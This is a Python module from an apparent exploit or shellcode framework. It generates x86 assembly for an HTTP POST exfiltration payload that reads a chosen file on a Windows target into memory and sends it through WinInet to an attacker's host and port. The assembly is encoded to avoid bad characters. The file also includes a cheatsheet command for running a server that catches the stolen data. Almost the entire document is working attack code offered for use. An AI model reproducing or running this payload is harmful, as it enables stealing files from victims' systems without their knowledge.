"""HTTP POST exfiltration payload template via WinInet.

Reads a file from the target into a VirtualAlloc buffer, then POSTs the
contents to the attacker's HTTP server.

Template sequence:
  CreateFileA(src) -> VirtualAlloc -> ReadFile loop -> CloseHandle(file) ->
  InternetOpenA -> InternetConnectA -> HttpOpenRequestA("POST") ->
  HttpSendRequestA(buf, bytes_total) ->
  InternetCloseHandle (request) -> InternetCloseHandle (connect) ->
  InternetCloseHandle (session)

Required functions: LoadLibraryA, InternetOpenA, InternetConnectA,
                    HttpOpenRequestA, HttpSendRequestA,
                    InternetCloseHandle,
                    VirtualAlloc, CreateFileA, ReadFile, CloseHandle
Required variables: inet_session, inet_connect, inet_request,
                    file_handle, virt_buf, bytes_read, bytes_total
Required strings:   src_path, exfil_host, url_path, http_post, user_agent
"""
from __future__ import annotations

from .base import PayloadTemplate, TemplateConfig
from ..encode import (
    encode_dword,
    safe_push_dword, safe_push_imm,
    safe_lea, safe_mem_load, safe_mem_store,
    safe_push_mem, safe_call_mem,
    safe_add_to_mem, safe_sub_from_mem,
)


_DEFAULT_ALLOC = 0x100000


class HttpExfilTemplate(PayloadTemplate):

    def emit(self, layout, config: TemplateConfig) -> str:
        bc = config.badchars
        alloc_size = config.alloc_size or _DEFAULT_ALLOC

        createfile_off  = -layout.slot("CreateFileA").offset
        readfile_off    = -layout.slot("ReadFile").offset
        closehdl_off    = -layout.slot("CloseHandle").offset
        valloc_off      = -layout.slot("VirtualAlloc").offset
        inet_open_off   = -layout.slot("InternetOpenA").offset
        inet_conn_off   = -layout.slot("InternetConnectA").offset
        http_open_off   = -layout.slot("HttpOpenRequestA").offset
        http_send_off   = -layout.slot("HttpSendRequestA").offset
        inet_close_off  = -layout.slot("InternetCloseHandle").offset

        file_h_off      = -layout.slot("file_handle").offset
        virt_buf_off    = -layout.slot("virt_buf").offset
        bytes_read_off  = -layout.slot("bytes_read").offset
        bytes_total_off = -layout.slot("bytes_total").offset
        inet_sess_off   = -layout.slot("inet_session").offset
        inet_conn_h_off = -layout.slot("inet_connect").offset
        inet_req_off    = -layout.slot("inet_request").offset

        src_off     = -layout.slot("src_path").offset
        host_off    = -layout.slot("exfil_host").offset
        path_off    = -layout.slot("url_path").offset
        post_off    = -layout.slot("http_post").offset
        ua_off      = -layout.slot("user_agent").offset

        return "\n".join([
            "; -- HTTP POST Exfiltration Payload (WinInet) --",
            f"; Source: {config.src_path}",
            f"; POST to: {config.lhost}:{config.lport}{config.url_path}",
            "",

            # --- Phase 1: Read file into buffer ---
            "    ; CreateFileA(src_path, GENERIC_READ, FILE_SHARE_READ,",
            "    ;             NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)",
            "    xor  ebx, ebx",
            "    push ebx                    ; hTemplateFile = NULL",
            *safe_push_dword(0x80, bc),
            "    ; FILE_ATTRIBUTE_NORMAL",
            *safe_push_imm(3, bc),
            "    ; OPEN_EXISTING",
            "    push ebx                    ; lpSecurityAttributes = NULL",
            *safe_push_imm(1, bc),
            "    ; FILE_SHARE_READ",
            *_emit_generic_read(bc),
            "    ; GENERIC_READ = 0x80000000",
            *safe_lea("eax", "ebp", src_off, bc),
            "    push eax                    ; lpFileName",
            *safe_call_mem("ebp", createfile_off, bc),
            *safe_mem_store("ebp", file_h_off, "eax", bc),
            "",

            f"    ; VirtualAlloc(NULL, 0x{alloc_size:x}, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)",
            "    xor  eax, eax",
            *safe_push_imm(4, bc),
            "    ; PAGE_READWRITE",
            *safe_push_dword(0x3000, bc),
            "    ; MEM_COMMIT|MEM_RESERVE",
            *safe_push_dword(alloc_size, bc),
            "    ; dwSize",
            "    xor  eax, eax",
            "    push eax                    ; lpAddress = NULL",
            *safe_call_mem("ebp", valloc_off, bc),
            *safe_mem_store("ebp", virt_buf_off, "eax", bc),
            "",

            "    ; initialise bytes_total = 0",
            "    xor  eax, eax",
            *safe_mem_store("ebp", bytes_total_off, "eax", bc),
            "",

            "exfil_read_loop:",
            f"    ; remaining = 0x{alloc_size:x} - bytes_total",
            *encode_dword(alloc_size, bc, "ecx"),
            *safe_sub_from_mem("ecx", "ebp", bytes_total_off, bc),
            "    test ecx, ecx",
            "    jle  exfil_read_done         ; buffer full",
            *encode_dword(0x1000, bc, "edx"),
            "    cmp  ecx, edx",
            "    jle  exfil_read_sized",
            "    mov  ecx, edx               ; cap chunk at 4096",
            "exfil_read_sized:",
            "    push ecx                     ; save chunk size",
            "",
            "    ; buf ptr = virt_buf + bytes_total",
            *safe_mem_load("eax", "ebp", virt_buf_off, bc),
            *_safe_add_from_mem("eax", "ebp", bytes_total_off, bc),
            "",
            "    ; ReadFile(file_handle, buf, chunk_size, &bytes_read, NULL)",
            "    pop  ecx                     ; restore chunk size",
            "    xor  edx, edx",
            "    push edx                    ; lpOverlapped = NULL",
            *safe_lea("edx", "ebp", bytes_read_off, bc),
            "    push edx                    ; lpNumberOfBytesRead",
            "    push ecx                    ; nNumberOfBytesToRead",
            "    push eax                    ; lpBuffer",
            *safe_push_mem("ebp", file_h_off, bc),
            *safe_call_mem("ebp", readfile_off, bc),
            "",
            "    ; check return value (BOOL): 0 = failure",
            "    test eax, eax",
            "    jz   exfil_read_done",
            "",
            "    ; check bytes_read: 0 means EOF",
            *safe_mem_load("eax", "ebp", bytes_read_off, bc),
            "    test eax, eax",
            "    jz   exfil_read_done",
            *safe_add_to_mem("ebp", bytes_total_off, "eax", bc),
            "    jmp  exfil_read_loop",
            "",

            "exfil_read_done:",
            "    ; CloseHandle(file_handle)",
            *safe_push_mem("ebp", file_h_off, bc),
            *safe_call_mem("ebp", closehdl_off, bc),
            "",

            # --- Phase 2: POST data to attacker ---
            "    ; InternetOpenA(user_agent, INTERNET_OPEN_TYPE_DIRECT=1, NULL, NULL, 0)",
            "    xor  eax, eax",
            "    push eax                    ; dwFlags = 0",
            "    push eax                    ; lpszProxyBypass = NULL",
            "    push eax                    ; lpszProxy = NULL",
            *safe_push_imm(1, bc),
            "    ; dwAccessType = INTERNET_OPEN_TYPE_DIRECT",
            *safe_lea("eax", "ebp", ua_off, bc),
            "    push eax                    ; lpszAgent",
            *safe_call_mem("ebp", inet_open_off, bc),
            *safe_mem_store("ebp", inet_sess_off, "eax", bc),
            "",

            "    ; InternetConnectA(hSession, host, port, NULL, NULL,",
            "    ;                  INTERNET_SERVICE_HTTP=3, 0, 0)",
            "    xor  eax, eax",
            "    push eax                    ; dwContext = 0",
            "    push eax                    ; dwFlags = 0",
            *safe_push_imm(3, bc),
            "    ; INTERNET_SERVICE_HTTP",
            "    xor  eax, eax",
            "    push eax                    ; lpszPassword = NULL",
            "    push eax                    ; lpszUserName = NULL",
            *safe_push_imm(config.lport, bc),
            f"    ; nServerPort = {config.lport}",
            *safe_lea("eax", "ebp", host_off, bc),
            "    push eax                    ; lpszServerName",
            *safe_push_mem("ebp", inet_sess_off, bc),
            *safe_call_mem("ebp", inet_conn_off, bc),
            *safe_mem_store("ebp", inet_conn_h_off, "eax", bc),
            "",

            "    ; HttpOpenRequestA(hConnect, \"POST\", url_path, NULL, NULL, NULL, 0, 0)",
            "    xor  eax, eax",
            "    push eax                    ; dwContext = 0",
            "    push eax                    ; dwFlags = 0",
            "    push eax                    ; lplpszAcceptTypes = NULL",
            "    push eax                    ; lpszReferrer = NULL",
            "    push eax                    ; lpszVersion = NULL (HTTP/1.1)",
            *safe_lea("eax", "ebp", path_off, bc),
            "    push eax                    ; lpszObjectName (url_path)",
            *safe_lea("eax", "ebp", post_off, bc),
            "    push eax                    ; lpszVerb = \"POST\"",
            *safe_push_mem("ebp", inet_conn_h_off, bc),
            *safe_call_mem("ebp", http_open_off, bc),
            *safe_mem_store("ebp", inet_req_off, "eax", bc),
            "",

            "    ; HttpSendRequestA(hRequest, NULL, 0, buf, bytes_total)",
            *safe_push_mem("ebp", bytes_total_off, bc),
            "    ; dwOptionalLength = bytes_total",
            *safe_push_mem("ebp", virt_buf_off, bc),
            "    ; lpOptional = virt_buf",
            "    xor  eax, eax",
            "    push eax                    ; dwHeadersLength = 0",
            "    push eax                    ; lpszHeaders = NULL",
            *safe_push_mem("ebp", inet_req_off, bc),
            *safe_call_mem("ebp", http_send_off, bc),
            "",

            "    ; InternetCloseHandle(hRequest)",
            *safe_push_mem("ebp", inet_req_off, bc),
            *safe_call_mem("ebp", inet_close_off, bc),
            "",
            "    ; InternetCloseHandle(hConnect)",
            *safe_push_mem("ebp", inet_conn_h_off, bc),
            *safe_call_mem("ebp", inet_close_off, bc),
            "",
            "    ; InternetCloseHandle(hSession)",
            *safe_push_mem("ebp", inet_sess_off, bc),
            *safe_call_mem("ebp", inet_close_off, bc),
            "",
        ])

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        host = config.lhost
        port = config.lport
        url_path = config.url_path or "/exfil"
        if config.url:
            from urllib.parse import urlparse
            parsed = urlparse(config.url)
            if parsed.hostname:
                host = parsed.hostname
            if parsed.port:
                port = parsed.port
            if parsed.path:
                url_path = parsed.path
        return [
            ("Catch POST",
             f"python3 Tools/http_exfil_server.py --port {port} --bind {host}"),
            ("Source file on target", config.src_path or ""),
            ("POST endpoint", f"http://{host}:{port}{url_path}"),
        ]


def _safe_add_from_mem(
    dst: str, base: str, offset: int, bc: set[int],
) -> list[str]:
    from ..encode import safe_mem_load
    lines = safe_mem_load("ecx", base, offset, bc)
    lines.append(f"    add  {dst}, ecx")
    return lines


def _emit_generic_read(badchars: set[int]) -> list[str]:
    if 0x80 not in badchars:
        return [
            "    xor  eax, eax",
            "    mov  al, 0x80",
            "    shl  eax, 24               ; GENERIC_READ = 0x80000000",
            "    push eax",
        ]
    lines = encode_dword(0x80000000, badchars, "eax")
    lines.append("    push eax")
    return lines
